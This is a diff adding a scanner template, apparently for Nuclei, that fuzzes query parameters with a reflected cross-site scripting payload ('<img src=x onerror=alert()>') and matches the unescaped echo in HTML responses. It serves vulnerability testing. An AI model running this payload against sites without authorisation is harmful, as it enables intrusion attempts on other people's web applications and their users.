@@ -1,0 +1,36 @@
+id: golang-xss
+
+info:
+  name: Golang XSS
+  author: reewardius
+  severity: medium
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      xss:
+        - "<a/href/='https://google.com/#><img src=x onerror=alert()>slon</img></h1>'>google</a>"
+        
+    fuzzing:
+      - part: query
+        mode: single
+        type: replace
+        fuzz:
+          - "{{xss}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<img src=x onerror=alert()>slon</img>"
+          
+      - type: word
+        part: header
+        words:
+          - text/html
